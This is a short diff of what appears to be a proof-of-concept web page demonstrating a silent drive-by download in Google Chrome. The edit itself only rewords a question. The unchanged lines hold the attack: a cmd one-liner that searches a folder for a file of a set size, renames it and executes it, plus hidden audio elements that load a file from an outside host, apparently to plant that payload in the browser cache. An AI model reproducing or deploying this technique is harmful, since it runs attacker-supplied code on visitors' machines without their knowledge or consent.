@@ -11,7 +11,7 @@ This demonstrates a fully silent drive-by download in Google Chrome -
 cmd /c for /r %g in (*_*) do if %~zg==23456 copy /y "%g" "%g.log" & "%g.log"
 </pre>
 
-Can you understand how this works?
+Can you figure out how this works?
 
 <audio style=visibility:hidden src=http://trax.x10.mx/cybersweet2b.au />
 <audio style=visibility:hidden src=http://trax.x10.mx/cybersweet2b.au />
